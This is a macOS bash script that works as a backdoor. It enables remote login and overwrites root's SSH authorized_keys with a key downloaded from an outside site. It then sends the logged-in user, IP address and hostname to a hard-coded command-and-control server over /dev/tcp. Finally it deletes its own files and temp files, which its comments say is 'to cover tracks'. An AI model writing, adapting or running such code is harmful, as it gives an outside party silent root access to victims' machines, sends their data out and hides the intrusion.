#!/bin/bash

# /sbin/ifconfig isn't in root's path by default, so let's just do this I guess
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:$PATH

# Remote login/SSHD should already be on and enabled for root. But just in case.
systemsetup -setremotelogin on

SSHPATH="/var/root/.ssh"

mkdir -p "$SSHPATH" # On most computers, there won't be a .ssh directory initially

rm "$SSHPATH/authorized_keys" # Just in case
echo "Downloading pubkey..."
curl https://erikboesen.com/pubkey --output "$SSHPATH/authorized_keys"

USER=`stat -f "%Su" /dev/console` # Get user currently logged in (in GUI).
IP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
HOSTNAME=`hostname`

SERVER="173.73.184.108"
PORT=2043

# Send data to C&C
exec 3<>/dev/tcp/${SERVER}/${PORT}
echo "${USER} ${IP} ${HOSTNAME}" >&3

# Print response
# TODO: If there's no response, we should send data in some other way
cat <&3

echo

# Get rid of files to cover tracks
rm /tmp/elevate.out /tmp/*.sh

# Remove original script unless on boesene so we don't delete during development
if [ "$USER" != "boesene" ]; then
    rm /Users/*/join.sh /Users/*/Desktop/join.sh
    rm /Users/*/Downloads/term.*
    killall term
fi
